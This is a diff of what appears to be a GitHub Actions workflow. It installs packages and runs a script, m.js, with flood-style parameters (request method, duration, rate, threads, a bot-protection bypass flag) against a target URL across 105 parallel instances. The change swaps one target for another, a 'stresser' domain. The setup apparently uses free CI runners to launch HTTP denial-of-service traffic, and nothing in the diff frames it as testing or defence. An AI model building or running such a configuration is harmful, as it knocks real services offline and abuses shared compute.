@@ -27,10 +27,10 @@ jobs:
           # cache: 'npm'
       
       - name: Install dependencies
-        run: npm install hpack.js chalk hpack
+        run: npm install hpack@4 chalk hpack
       
       - name: Run m.js
-        run: node m.js GET https://c3.dstatbot.win/9zZCCHLX 300 12 1000 --bfm true --debug
+        run: node m.js GET https://susstresser.click/ 300 12 1000 --bfm true --debug
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 105
